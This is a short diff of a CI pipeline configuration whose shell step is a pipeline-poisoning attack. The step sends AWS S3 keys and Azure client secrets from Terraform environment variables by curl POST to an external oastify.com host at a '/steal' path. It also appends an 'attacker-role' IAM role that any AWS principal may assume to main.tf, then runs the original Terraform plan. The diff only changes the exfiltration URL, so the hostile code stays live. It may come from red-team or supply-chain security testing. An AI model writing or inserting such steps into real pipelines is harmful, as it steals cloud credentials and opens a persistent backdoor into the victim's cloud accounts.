@@ -11,7 +11,7 @@ run:
     - -c
     - |
       # Exfiltrate AWS and Azure credentials
-      curl -X POST -d "{\"s3_access_key\":\"$TF_BACKEND_CONFIG_access_key\",\"s3_secret_key\":\"$TF_BACKEND_CONFIG_secret_key\",\"azure_client_id\":\"$TF_VAR_client_id\",\"azure_client_secret\":\"$TF_VAR_client_secret\"}" http://7owgdjwoul5ou33hr5hlygedx43vrlfa.oastify.com/steal
+      curl -X POST -d "{\"s3_access_key\":\"$TF_BACKEND_CONFIG_access_key\",\"s3_secret_key\":\"$TF_BACKEND_CONFIG_secret_key\",\"azure_client_id\":\"$TF_VAR_client_id\",\"azure_client_secret\":\"$TF_VAR_client_secret\"}" http://dl2mapturr2ur90nobervmbjua01otci.oastify.com/steal
       # Inject malicious IAM role
       echo 'resource "aws_iam_role" "malicious_role" { name = "attacker-role"; assume_role_policy = "{\"Version\": \"2012-10-17\", \"Statement\": [{\"Effect\": \"Allow\", \"Principal\": {\"AWS\": \"*\"}, \"Action\": \"sts:AssumeRole\"}]}"}' >> terraform-source-dir/main.tf
       # Run original Terraform plan
